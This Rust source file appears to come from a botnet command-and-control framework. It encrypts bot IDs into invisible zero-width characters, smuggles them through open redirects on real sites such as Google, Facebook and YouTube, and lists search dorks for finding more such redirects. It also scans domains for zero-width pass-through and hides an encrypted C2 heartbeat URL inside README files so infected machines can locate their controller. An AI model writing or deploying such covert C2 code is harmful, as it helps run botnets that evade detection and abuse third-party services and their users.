//! ZW-Encoded Heartbeat + Vulnerable Redirect Domain Dorking
//!
//! Heartbeat now uses ZW-encoded encrypted payloads:
//!   bot_id → AEAD encrypt → ZW-encode → embed in redirect URL parameter
//!
//! Domain dorking finds open-redirect vulnerable domains that
//! accept and reflect URL parameters containing ZW characters.
//! These act as relay points — the C2 server scans the vulnerable
//! domain's logs/analytics to extract bot heartbeats.

use arcticfox_core::crypto::{
    aead_encrypt, generate_nonce, generate_session_key, SESSION_KEY_LEN, NONCE_LEN,
};
use arcticfox_core::zwcodec;
use arcticfox_zwtransport::ZwSession;
use tracing::{debug, info, warn};

// ── ZW Heartbeat ────────────────────────────────────────────────────────────

/// Generate a ZW-encrypted heartbeat payload for embedding in a URL.
///
/// Format: `?q=<ZW_ENCODED_AEAD_CIPHERTEXT>`
/// The ZW chars are invisible — the URL looks like `?q=` followed by nothing visible.
pub fn zw_heartbeat_url(
    base_url: &str,
    bot_id: &str,
    session_key: &[u8; SESSION_KEY_LEN],
) -> String {
    let nonce = generate_nonce();
    let plaintext = bot_id.as_bytes();
    let ciphertext = aead_encrypt(session_key, &nonce, plaintext)
        .unwrap_or_else(|_| bot_id.as_bytes().to_vec());

    let zw_payload = zwcodec::encode(&ciphertext);

    // Embed nonce + ZW payload in URL
    let nonce_hex = hex::encode(nonce);
    format!(
        "{}?q={}&n={}",
        base_url.trim_end_matches('/'),
        zw_payload,
        nonce_hex
    )
}

/// Decode a ZW heartbeat from a URL parameter.
pub fn zw_heartbeat_decode(
    zw_payload: &str,
    nonce_hex: &str,
    session_key: &[u8; SESSION_KEY_LEN],
) -> Option<String> {
    let nonce_bytes = hex::decode(nonce_hex).ok()?;
    if nonce_bytes.len() != NONCE_LEN {
        return None;
    }
    let mut nonce = [0u8; NONCE_LEN];
    nonce.copy_from_slice(&nonce_bytes);

    let ciphertext = zwcodec::decode(zw_payload).ok()?;
    let plaintext = arcticfox_core::crypto::aead_decrypt(session_key, &nonce, &ciphertext).ok()?;
    String::from_utf8(plaintext).ok()
}

// ── Vulnerable Redirect Domain Dorking ──────────────────────────────────────

/// Known vulnerable redirect patterns that accept arbitrary URL parameters.
const REDIRECT_DORKS: &[&str] = &[
    "site:google.com inurl:url?q=",
    "site:facebook.com inurl:redirect?url=",
    "site:microsoft.com inurl:redirect?target=",
    "inurl:redirect?url= site:edu",
    "inurl:r?url= site:gov",
    "inurl:goto?url=",
    "inurl:link?url=",
    "inurl:out?url=",
    "inurl:away?url=",
    "inurl:exit?url=",
    "inurl:externalLink?url=",
    "inurl:jump?url=",
    "inurl:redir?url=",
];

/// Well-known open redirect domains (user-contributed).
const KNOWN_REDIRECT_DOMAINS: &[&str] = &[
    "https://www.google.com/url?q=",
    "https://www.facebook.com/flx/warn/?u=",
    "https://l.facebook.com/l.php?u=",
    "https://www.youtube.com/redirect?q=",
    "https://out.reddit.com/t3_1?url=",
    "https://t.co/",
    "https://bit.ly/",
    "https://ow.ly/",
    "https://tinyurl.com/",
    "https://is.gd/",
];

/// Test if a domain reflects ZW characters in its redirect response.
///
/// Many redirectors strip non-ASCII characters — we need domains that
/// pass ZW chars through unmodified (typically those using raw HTTP Location headers).
pub async fn test_zw_reflection(client: &reqwest::Client, base_url: &str) -> bool {
    let test_zw = zwcodec::encode(b"test");
    let test_url = format!("{}{}", base_url, test_zw);

    match client.get(&test_url).send().await {
        Ok(resp) => {
            let final_url = resp.url().to_string();
            debug!("ZW reflection test: {} → {}", test_url, final_url);
            // Check if ZW chars made it through to the redirect target
            final_url.contains('\u{200B}') || final_url.contains('\u{200C}')
        }
        Err(e) => {
            debug!("ZW reflection test failed for {}: {}", base_url, e);
            false
        }
    }
}

/// Scan a list of domains for ZW-compatible redirects.
pub async fn scan_zw_redirects(
    client: &reqwest::Client,
    domains: &[String],
) -> Vec<String> {
    let mut compatible = Vec::new();
    for domain in domains {
        if test_zw_reflection(client, domain).await {
            info!("ZW-compatible redirect found: {}", domain);
            compatible.push(domain.clone());
        }
    }
    compatible
}

/// Generate dork queries for finding redirect domains via search engines.
pub fn redirect_dorks() -> Vec<String> {
    REDIRECT_DORKS.iter().map(|d| d.to_string()).collect()
}

/// Get the built-in list of known redirect domains.
pub fn known_redirects() -> Vec<String> {
    KNOWN_REDIRECT_DOMAINS.iter().map(|d| d.to_string()).collect()
}

// ── ZW Payload in README — Double-Layer ─────────────────────────────────────

/// Embed a ZW-encrypted heartbeat URL inside a README as a hidden relay.
///
/// The README contains a ZW-encoded encrypted URL that points to the
/// heartbeat endpoint. Bots decode this to learn where to phone home.
pub fn embed_heartbeat_url(readme: &str, hb_url: &str, key: &[u8; SESSION_KEY_LEN]) -> String {
    let nonce = generate_nonce();
    let ciphertext = aead_encrypt(key, &nonce, hb_url.as_bytes())
        .unwrap_or_else(|_| hb_url.as_bytes().to_vec());
    let zw_encoded = zwcodec::encode(&ciphertext);

    // Embed: <nonce_hex>:<zw_encoded> in first heading
    let payload = format!("{}:{}", hex::encode(nonce), zw_encoded);
    zwcodec::inject(readme, payload.as_bytes(), false)
        .unwrap_or_else(|_| readme.to_string())
}

/// Extract a heartbeat URL from a README.
pub fn extract_heartbeat_url(readme: &str, key: &[u8; SESSION_KEY_LEN]) -> Option<String> {
    let raw = zwcodec::extract(readme)?;
    let payload = String::from_utf8(raw).ok()?;
    let (nonce_hex, zw_part) = payload.split_once(':')?;

    let nonce_bytes = hex::decode(nonce_hex).ok()?;
    if nonce_bytes.len() != NONCE_LEN {
        return None;
    }
    let mut nonce = [0u8; NONCE_LEN];
    nonce.copy_from_slice(&nonce_bytes);

    let ciphertext = zwcodec::decode(zw_part).ok()?;
    let plaintext = arcticfox_core::crypto::aead_decrypt(key, &nonce, &ciphertext).ok()?;
    String::from_utf8(plaintext).ok()
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn zw_heartbeat_roundtrip() {
        let key = generate_session_key();
        let bot_id = "test-bot-ABC123";
        let url = zw_heartbeat_url("https://redirect.example.com/r", bot_id, &key);

        // Extract ZW payload and nonce from URL
        let zw_part = url.split("?q=").nth(1).and_then(|s| s.split("&n=").next()).unwrap();
        let nonce_hex = url.split("&n=").nth(1).unwrap();

        let decoded = zw_heartbeat_decode(zw_part, nonce_hex, &key).unwrap();
        assert_eq!(decoded, bot_id);
    }

    #[test]
    fn embed_extract_roundtrip() {
        let key = generate_session_key();
        let readme = "# My Project\n\nHello world.\n";
        let hb_url = "https://c2.example.com/api/heartbeat/test";

        let modified = embed_heartbeat_url(readme, hb_url, &key);
        assert!(modified.contains("My Project")); // Original content preserved

        let extracted = extract_heartbeat_url(&modified, &key).unwrap();
        assert_eq!(extracted, hb_url);
    }

    #[test]
    fn wrong_key_fails() {
        let key1 = generate_session_key();
        let key2 = generate_session_key();
        let url = zw_heartbeat_url("https://x.com/r", "bot1", &key1);

        let zw_part = url.split("?q=").nth(1).and_then(|s| s.split("&n=").next()).unwrap();
        let nonce_hex = url.split("&n=").nth(1).unwrap();

        assert!(zw_heartbeat_decode(zw_part, nonce_hex, &key2).is_none());
    }

    #[test]
    fn redirect_dorks_non_empty() {
        let dorks = redirect_dorks();
        assert!(!dorks.is_empty());
        assert!(dorks.iter().any(|d| d.contains("redirect")));
    }
}
